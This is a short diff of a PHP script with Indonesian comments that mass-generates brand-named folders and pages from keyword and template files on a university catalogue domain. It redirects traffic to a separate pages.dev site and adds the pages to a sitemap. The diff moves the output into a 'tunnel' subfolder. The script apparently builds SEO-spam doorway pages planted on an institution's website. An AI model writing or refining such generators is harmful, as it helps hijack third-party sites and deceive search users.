@@ -7,7 +7,7 @@ $config = [
     'brandFile' => 'brand.txt',
     'deskripsiFile' => 'deskripsi.txt',
     'keywordsFile' => 'keywords.txt',
-    'outputDir' => __DIR__ . '/',
+    'outputDir' => __DIR__ . '/tunnel',
     'templateFile' => 'template.html',
     'baseUrl' => rtrim('https://opac.handayani.ac.id', '/'), // Hilangkan trailing slash
     'urltujuan' => 'https://amp-ensign-edu-sa.pages.dev',
@@ -75,7 +75,7 @@ foreach ($brands as $i => $brand) {
 
     // Sanitasi nama folder
     $folderName = preg_replace('/[^a-z0-9-]/', '-', strtolower(str_replace(' ', '-', $brand)));
-    $targetDir = $config['outputDir'] . 'http://opac.handayani.ac.id/' . $folderName;
+    $targetDir = $config['outputDir'] . '/' . $folderName;
 
     // Buat folder
     if (!is_dir($targetDir) && !mkdir($targetDir, 0755, true)) {
@@ -128,7 +128,7 @@ foreach ($brands as $i => $brand) {
 
     // Tambahkan ke sitemap
     if ($config['createSitemap']) {
-        $sitemapEntries[] = "    <url>\n        <loc>{$config['baseUrl']}//{$folderName}/</loc>\n        <lastmod>" . date('Y-m-d') . "</lastmod>\n    </url>";
+        $sitemapEntries[] = "    <url>\n        <loc>{$config['baseUrl']}/tunnel/{$folderName}/</loc>\n        <lastmod>" . date('Y-m-d') . "</lastmod>\n    </url>";
     }
 
     echo "✅ Folder dibuat: $folderName\n";
@@ -147,8 +147,4 @@ if ($config['createSitemap'] && !empty($sitemapEntries)) {
     }
 }
 
-
 echo "🎉 Proses selesai.\n";
-
-
-
